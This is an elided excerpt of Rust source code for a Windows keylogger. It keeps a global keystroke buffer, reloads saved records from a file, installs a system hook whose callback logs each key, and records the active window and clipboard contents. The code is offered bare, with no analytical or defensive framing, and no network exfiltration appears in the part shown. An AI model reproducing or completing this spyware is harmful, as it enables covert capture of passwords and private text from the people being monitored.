...
/// Get a reference to the global buffer, if initialized.
pub fn get_buffer() -> Option<&'static Arc<Mutex<String>>> {
    KEYLOG_BUFFER.get()
}
...
pub fn init_buffer() -> Arc<Mutex<String>> {
    let buffer = KEYLOG_BUFFER.get_or_init(|| Arc::new(Mutex::new(String::new()))).clone();
        ...
        if let Ok(mut file) = fs::File::open(path) {
            ...
            if file.read_to_end(&mut buffer).is_ok() {
                ...
                while cursor < buffer.len() {
                    ...
                    let len_bytes: [u8; 4] = match buffer[cursor..cursor+4].try_into() {
                        Ok(b) => b,
                        Err(_) => break,
                    };
...
mod windows {
    ...
    static MS_HOOK: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
    ...
    unsafe extern "system" fn ms_hook_callback(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
        ...
        CallNextHookEx(MS_HOOK.load(Ordering::Relaxed), n_code, w_param, l_param)
    }
    ...
    unsafe fn process_key(vk_code: u32) {
        ...
        if let Some(arc) = super::get_buffer() {
            if let Ok(mut guard) = arc.lock() {
                if let Ok(mut lw) = LAST_WINDOW.lock() {
                    match lw.as_ref() {
                        ...
                        if !h_data.is_null() {
                            ...
                            if !p_text.is_null() {
                                ...
                                if let Ok(text) = String::from_utf16(slice) {
                                    let changed = match LAST_CLIPBOARD.lock() {
